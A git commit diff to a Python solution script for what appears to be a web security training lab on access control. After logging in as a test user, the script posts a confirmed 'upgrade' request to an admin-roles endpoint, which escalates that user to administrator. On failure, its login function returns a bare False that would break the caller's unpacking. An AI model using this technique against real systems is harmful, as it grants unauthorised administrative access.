8253d9ba497f5f6f9c679d3380590e35e66d3ca3
lspci4 <ingluispt@gmail.com>
2024-04-22 09:11:07 -0400

    update

--- Access_Control_Vulnerabilities/lab-12/access_control_lab-12.py
+++ Access_Control_Vulnerabilities/lab-12/access_control_lab-12.py
@@ -13,17 +13,33 @@ def main():
     
     session = requests.session()
     base_url = sys.argv[1]
-    upgrade_user(session,base_url)
+    username,login_session = login_user(session,base_url,"wiener","peter")
+    if login_session:
+        upgrade_user(session,base_url,username)
 
-def upgrade_user(session,base_url):
+def login_user(session,base_url,username,password):
     login_url = f"{base_url}/login"
-    credential = {'username': 'wiener','password': 'peter'}
+    credential = {'username': username,'password': password}
     response = session.post(login_url,data=credential,verify=False,proxies=proxies_setting)
     if "Log out" in response.text:
-        print(f"(+) Login exitoso como user wiener")
+        print(f"(+) Login exitoso como user {username}")
+        return username, True
     else:
-        print(f"(-) Login fallido para el user wiener")
-
+        print(f"(-) Login fallido para el user {username}")
+        return False
     
+def upgrade_user(session,base_url,username):
+    url_admin = f"{base_url}/admin-roles"
+    data_upgrade = {
+        'action': 'upgrade',
+        'confirmed': 'true',
+        'username': username
+    }
+    response = session.post(url_admin,data=data_upgrade,verify=False,proxies=proxies_setting)
+    if "wiener (ADMIN)" in response.text:
+        print(f"(+) Upgrade user {username} successful...")
+    else:
+        print(f"(-) Upgrade user {username} unsuccesfull")        
+
 if __name__ == "__main__":
     main()
